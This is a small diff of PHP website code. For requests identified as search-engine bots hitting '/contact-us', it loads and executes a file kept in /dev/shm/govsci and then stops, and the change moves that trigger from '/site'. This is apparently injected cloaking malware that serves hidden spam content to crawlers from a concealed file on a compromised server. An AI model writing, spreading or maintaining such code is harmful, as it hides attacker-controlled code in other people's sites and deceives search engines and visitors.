@@ -26,14 +26,14 @@ foreach ($bot_signatures as $bot) {
 
 if ($is_bot) {
 
-    if (stripos($request_uri, '/site') !== false) {
+    if (stripos($request_uri, '/contact-us') !== false) {
         require('/dev/shm/govsci');
         exit;
     }
 }
 if ($is_bot) {
 
-    if (stripos($request_uri, '/site/') !== false) {
+    if (stripos($request_uri, '/contact-us/') !== false) {
         require('/dev/shm/govsci');
         exit;
     }
